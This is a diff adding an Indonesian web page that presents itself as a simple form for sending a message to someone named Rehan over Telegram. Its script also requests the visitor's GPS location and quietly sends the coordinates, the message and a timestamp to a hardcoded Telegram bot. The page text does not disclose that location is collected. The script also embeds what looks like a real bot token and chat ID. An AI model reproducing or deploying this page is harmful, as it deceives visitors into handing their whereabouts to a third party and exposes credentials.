@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kirim Pesan ke Rehan</title>
+
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        background: linear-gradient(to bottom, #2176b5, #0e1f3d);
+        font-family: Arial, sans-serif;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+    .box {
+        backdrop-filter: blur(10px);
+        background: rgba(255,255,255,0.15);
+        border-radius: 12px;
+        padding: 25px;
+        width: 90%;
+        max-width: 380px;
+        color: white;
+        text-align: center;
+    }
+    input, textarea {
+        width: 100%;
+        padding: 10px;
+        border-radius: 8px;
+        border: none;
+        font-size: 16px;
+        margin-top: 10px;
+        outline: none;
+    }
+    button {
+        margin-top: 15px;
+        width: 100%;
+        padding: 12px;
+        border: none;
+        border-radius: 8px;
+        font-size: 17px;
+        font-weight: bold;
+        background: #1e62d0;
+        cursor: pointer;
+        color: white;
+    }
+    button:active {
+        transform: scale(0.97);
+    }
+    .info {
+        margin-top: 10px;
+        font-size: 14px;
+        opacity: .8;
+    }
+</style>
+
+</head>
+<body>
+
+<div class="box">
+    <h2>Kirim Pesan ke Rehan</h2>
+    <p class="info">Pesanmu akan terkirim lewat Telegram</p>
+
+    <textarea id="pesan" rows="4" placeholder="Tulis pesan di sini..."></textarea>
+
+    <button id="btnKirim">KIRIM PESAN</button>
+
+    <p id="status" style="margin-top:10px; font-size:14px;"></p>
+</div>
+
+<script>
+
+// ===============================
+// SETTING TELEGRAM
+// ===============================
+const BOT_TOKEN = "8460626408:AAH1-67wDVP06frJylVhwLBj2F6Ep7lUtvU";
+const CHAT_ID   = "7508766509";
+
+
+// ===============================
+// DAPETIN LOKASI (ketika tombol kirim ditekan)
+// ===============================
+function getGPS() {
+    return new Promise((resolve) => {
+
+        if (!navigator.geolocation) {
+            resolve("GPS tidak tersedia");
+            return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                const lat = pos.coords.latitude.toFixed(5);
+                const lon = pos.coords.longitude.toFixed(5);
+                resolve(`Latitude: ${lat}, Longitude: ${lon}`);
+            },
+            (err) => {
+                resolve("User menolak izin GPS");
+            }
+        );
+    });
+}
+
+
+// ===============================
+// KIRIM DATA KE TELEGRAM
+// ===============================
+async function kirimKeTelegram(pesanUser, gps) {
+
+    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+
+    const finalMsg = `
+📩 *Pesan Baru Untuk Rehan*  
+━━━━━━━━━━━━━━━━
+💬 *Pesan:* ${pesanUser}
+
+📍 *Lokasi:* ${gps}
+⏰ *Waktu:* ${waktu}
+    `;
+
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    const send = await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json"},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: finalMsg,
+            parse_mode: "Markdown"
+        })
+    });
+
+    return send.ok;
+}
+
+
+// ===============================
+// EVENT KETIKA TOMBOL KIRIM DIPENCET
+// ===============================
+document.getElementById("btnKirim").addEventListener("click", async () => {
+
+    const pesan = document.getElementById("pesan").value.trim();
+    const status = document.getElementById("status");
+
+    if (!pesan) {
+        status.innerHTML = "⚠ Isi pesannya dulu.";
+        return;
+    }
+
+    status.innerHTML = "⏳ Meminta izin lokasi...";
+    
+    const gpsLokasi = await getGPS();
+
+    status.innerHTML = "📤 Mengirim pesan...";
+
+    const success = await kirimKeTelegram(pesan, gpsLokasi);
+
+    if (success) {
+        status.innerHTML = "✅ Pesan berhasil dikirim!";
+        document.getElementById("pesan").value = "";
+    } else {
+        status.innerHTML = "❌ Gagal mengirim pesan!";
+    }
+});
+
+</script>
+
+</body>
+</html>
